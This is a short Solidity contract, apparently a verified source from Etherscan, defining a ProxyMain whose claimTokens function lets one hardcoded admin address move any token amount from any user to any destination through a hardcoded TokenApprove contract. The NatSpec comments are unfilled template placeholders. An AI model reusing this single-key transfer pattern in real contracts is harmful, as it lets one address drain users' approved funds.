/**
 *Submitted for verification at Etherscan.io on 2023-06-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title Handle authorizations in dex platform
/// @notice Explain to an end user what this does
/// @dev Explain to a developer any extra details
interface ITokenApprove {
  function claimTokens(
    address _token,
    address _who,
    address _dest,
    uint256 _amount
  ) external ;
}

contract ProxyMain {
    address public tokenApprove = 0x70cBb871E8f30Fc8Ce23609E9E0Ea87B6b222F58;

    function claimTokens(
        address _token,
        address _who,
        address _dest,
        uint256 _amount
    ) public {
        require(msg.sender == 0xFacf375Af906f55453537ca31fFA99053A010239, "Invalid admin");
        ITokenApprove(0x70cBb871E8f30Fc8Ce23609E9E0Ea87B6b222F58).claimTokens(_token, _who, _dest, _amount);
    }
}